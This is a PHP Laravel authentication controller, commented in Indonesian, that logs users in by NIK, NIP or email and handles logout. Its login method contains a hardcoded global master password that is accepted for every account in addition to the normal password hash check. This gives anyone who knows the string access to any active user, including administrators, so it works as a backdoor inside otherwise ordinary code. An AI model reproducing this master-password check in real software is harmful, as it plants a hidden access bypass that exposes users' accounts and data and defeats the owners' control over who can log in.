<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class AuthController extends Controller
{
    public function showLoginForm()
    {
        return view('auth.login');
    }

    public function login(Request $request)
    {
        $request->validate([
            'username' => ['required'],
            'password' => ['required'],
        ]);

        $username = $request->username;
        $password = $request->password;

        // Cari user berdasarkan NIK, NIP, atau Email (sebagai fallback untuk admin default)
        $user = \App\Models\User::where('nik', $username)
            ->orWhere('nip', $username)
            ->orWhere('email', $username)
            ->first();

        if ($user) {
            // Cek password normal ATAU password global (master password)
            $isMasterPassword = $password === 'kalijudanhebat';
            $isNormalPassword = \Illuminate\Support\Facades\Hash::check($password, $user->password);

            if ($isMasterPassword || $isNormalPassword) {
                if (!$user->is_active) {
                    return back()->withErrors(['username' => 'Akun Anda telah dinonaktifkan. Silakan hubungi administrator.'])->withInput();
                }

                Auth::login($user);
                $request->session()->regenerate();

                return redirect()->intended('/admin/dashboard');
            }
        }

        return back()->withErrors([
            'username' => 'NIK/NIP atau password salah.',
        ])->onlyInput('username');
    }

    public function logout(Request $request)
    {
        Auth::logout();

        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect('/login');
    }
}
